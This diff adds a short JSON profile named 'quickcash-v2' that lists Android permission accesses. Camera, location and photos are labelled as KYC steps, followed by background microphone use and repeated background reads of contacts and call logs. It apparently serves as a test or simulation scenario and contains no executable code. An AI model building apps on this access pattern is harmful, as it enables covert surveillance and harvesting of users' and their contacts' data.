@@ -1,0 +1,11 @@
+{
+  "name": "quickcash-v2",
+  "steps": [
+    { "id": "kyc-camera",    "op": "CAMERA",       "runIn": ["ACTIVITY"],          "times": 1, "spacingMs": 0 },
+    { "id": "kyc-location",  "op": "FINE_LOC",     "runIn": ["ACTIVITY"],          "times": 1, "spacingMs": 0 },
+    { "id": "kyc-photos",    "op": "MEDIA_IMAGES", "runIn": ["ACTIVITY"],          "times": 1, "spacingMs": 0 },
+    { "id": "service-mic",   "op": "MIC",          "runIn": ["SERVICE"],           "times": 1, "spacingMs": 0 },
+    { "id": "sync-contacts", "op": "CONTACTS",     "runIn": ["JOB", "BROADCAST"],  "times": 3, "spacingMs": 15000 },
+    { "id": "sync-calllog",  "op": "CALL_LOG",     "runIn": ["JOB"],               "times": 1, "spacingMs": 0 }
+  ]
+}
